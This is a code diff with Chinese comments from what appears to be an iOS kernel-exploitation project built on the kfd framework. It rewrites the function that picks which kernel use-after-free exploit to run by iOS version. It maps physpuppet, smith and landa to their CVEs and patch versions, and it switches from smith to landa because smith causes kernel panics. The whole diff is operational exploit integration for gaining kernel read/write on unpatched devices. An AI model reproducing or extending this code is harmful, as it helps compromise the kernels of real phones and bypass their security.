@@ -188,27 +188,38 @@ bool km_init(const char **err)
     }
 
     /*
-     * PUAFF 也必须按版本选 —— 写死 physpuppet 会让 iOS 16.4 及以上直接失效。
+     * PUAFF 按版本选。三个方法的适用范围来自 kfd 自己的 README：
+     *   physpuppet = CVE-2023-23536  →  iOS 16.4 修复
+     *   smith      = CVE-2023-32434  →  iOS 16.5.1 修复
+     *   landa      = CVE-2023-41974  →  iOS 17.0 修复
      *
-     * 三个 PUAF 各自的修复版本：
-     *   physpuppet = CVE-2023-23536   →  iOS 16.4 修复
-     *   smith      = CVE-2023-32434   →  iOS 16.5.1 修复
-     *   landa      = CVE-2023-41974   →  iOS 17.0 修复
+     * 但「没被修」不等于「能用」。README 里另有一句直接关系到设备安全：
      *
-     * 所以在本项目覆盖的 15.0–16.4.1 区间里：
-     *   15.x – 16.3  →  physpuppet（更简单，先在它上面跑通）
-     *   16.4 – 16.4.1 →  physpuppet 已被修，必须 smith
-     *   （landa 在 16.5.1 之后才有意义，本区间用不到）
+     *   "It sleeps for 30 seconds because the kernel might panic on exit for
+     *    certain PUAF methods that require some cleanup post-KRKW
+     *    (e.g. puaf_smith)."
      *
-     * 这条漏掉的话，表现是 16.4.1 那台"PUAFF 不落地"，而不是编译错误 ——
-     * 所以它必须在设备上分版本各验一次。
+     * smith 破坏 VM 的 hole list，清理不成立时**内核 panic**（整个设备彩屏重启，
+     * 不是 app 崩）。实测在 16.4.1 上用 smith 就是这个结果。
+     *
+     * 所以分区改成：
+     *   15.x – 16.3    →  physpuppet（最简单、无清理风险）
+     *   16.4 – 16.5    →  landa（smith 的窗口，但 smith 会 panic；landa 到 17.0
+     *                            才修，在这个区间同样可用且不破坏 hole list）
+     *   16.5.1 及以上  →  landa
+     *
+     * 也就是：**smith 一律不用**。它的收益（覆盖一个我们也能用 landa 的窄区间）
+     * 完全抵不过每次失败换一次内核 panic 的代价。
      */
     u64 puafMethod;
     if (@available(iOS 16.4, *)) {
-        puafMethod = puaf_smith;
+        puafMethod = puaf_landa;
     } else {
         puafMethod = puaf_physpuppet;
     }
+
+    NSLog(@"[KernelMemory] puaf method = %s",
+          (puafMethod == puaf_landa) ? "landa" : "physpuppet");
 
     /*
      * kread 后端按 iOS 版本分派 —— 与样本一致。
@@ -258,9 +269,14 @@ bool km_init(const char **err)
     const u64 writeMethod = (readMethod == kread_IOSurface) ? kwrite_IOSurface
                                                             : kwrite_sem_open;
 
+    /*
+     * 到这一步就没有回头路了：kopen 里 PUAFF 一旦失败，可能让**内核** panic
+     * （整个设备彩屏重启，不是 app 崩）。NSLog 进 unified log、会落盘，
+     * 所以彩屏之后这一行是唯一还能查到的参数记录。
+     */
     NSLog(@"[KernelMemory] kopen(pages=%llu, puaf=%s, kread=%s, kwrite=%s)",
           (unsigned long long)kfd_puaf_pages,
-          (puafMethod == puaf_smith) ? "smith" : "physpuppet",
+          (puafMethod == puaf_landa) ? "landa" : "physpuppet",
           (readMethod == kread_IOSurface) ? "IOSurface" : "sem_open",
           (writeMethod == kwrite_IOSurface) ? "IOSurface" : "sem_open");
 
